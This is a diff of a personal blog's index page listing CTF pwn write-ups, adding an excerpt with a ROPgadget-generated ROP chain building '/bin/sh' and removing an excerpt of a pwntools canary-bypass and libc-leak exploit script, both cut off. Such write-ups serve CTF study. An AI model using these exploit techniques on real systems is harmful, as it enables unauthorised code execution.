@@ -134,6 +134,44 @@
     
     
     <div class="col-12 col-md-8 m-auto">
+      <a href="/2020/01/13/ROPgadget-not_the_same_3dsctf_2016/">
+        <p class="h4 index-header">ROPgadget-not_the_same_3dsctf_2016</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">ROPgadget-not_the_same_3dsctf_2016
+
+ROPgadget --binary not_the_same_3dsctf_2016 --ropchain
+自动生成
+from struct import pack
+p = &#39;&#39;
+p += pack(&#39;&lt;I&#39;, 0x0806fcca) # pop edx ; ret
+p += pack(&#39;&lt;I&#39;, 0x080eb060) # @ .data
+p += pack(&#39;&lt;I&#39;, 0x08048b0b) # pop eax ; ret
+p += &#39;/bin&#39;
+p += pack(&#39;&lt;I&#39;, 0x0805586b) # mov dword ptr [edx], eax ; ret
+p += pack(&#39;&lt;I&#39;, 0x0806fcca) # pop edx ; ret
+p += pack(&#39;&lt;I&#39;, 0x080eb064) # @ .data + 4
+p += p</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-13&nbsp;&nbsp;
+        
+        
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
       <a href="/2020/01/11/Linux%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/">
         <p class="h4 index-header">Linux常见问题解决方法</p>
         
@@ -364,7 +402,7 @@ def pwn(ip,port,debug):
     
     <div class="col-12 col-md-8 m-auto">
       <a href="/2020/01/04/TCPIP%E5%A4%8D%E4%B9%A0/">
-        <p class="h4 index-header">TCPIP复习</p>
+        <p class="h4 index-header">手动脱壳</p>
         
         
           
@@ -422,6 +460,11 @@ IP地址的低23位替换mac地址低</div>
           <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-04&nbsp;&nbsp;
         
         
+        
+          <i class="iconfont icon-tag"></i>
+          
+            <a href="/tags/%E4%B8%93%E4%B8%9A%E5%AD%A6%E4%B9%A0">专业学习</a>&nbsp;
+          
         
       </div>
     </div>
@@ -509,55 +552,6 @@ u32(sh.recvuntil(“\xf7”)[-4:]
       <div>
         
           <i class="iconfont icon-riqi2"></i>&nbsp;2019-12-23&nbsp;&nbsp;
-        
-        
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mb-4 mx-auto">
-    
-    
-    <div class="col-12 col-md-8 m-auto">
-      <a href="/2019/12/22/GXY_CTF_my_cannary-%E4%BB%8E%E9%9B%B6%E8%AE%B0%E5%BD%95%E5%A6%82%E4%BD%95%E8%B0%83%E8%AF%95%E5%87%BA%E6%9D%A5/">
-        <p class="h4 index-header">GXY_CTF_my_cannary-从零记录如何调试出来</p>
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">查看main
-
-进入test()
-
-看见了read，等等先
-
-judge无法反编译，查看汇编
-
-看见了xor rdx,[rbp-8]，以及上图的mov rdx, [rdx] 也就是先讲rdx指针里的数值放在rdx里，再将rdx和rbp-8的那个进行异或，一致则校验成功
-点开read的buf
-
-buf只有30字节
-再看看strings
-
-没有/bin/sh
-所以我们得先绕过栈校验，再leak libc地址，然后再system /bin/sh
-遂写poc
-from pwn import *
-sh = process(&quot;./my_cannary&quot;)
-elf = ELF(&quot;my_cannary&quot;)
-lib = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)
-pop_rdi_ret = 0x0400a43
-start_main = elf.symbols[&#39;main&#39;]
-context.log_level = &quot;debug&quot;
-context.arch = &#39;amd</div>
-        </div>
-      </a>
-
-      <div>
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2019-12-22&nbsp;&nbsp;
         
         
         
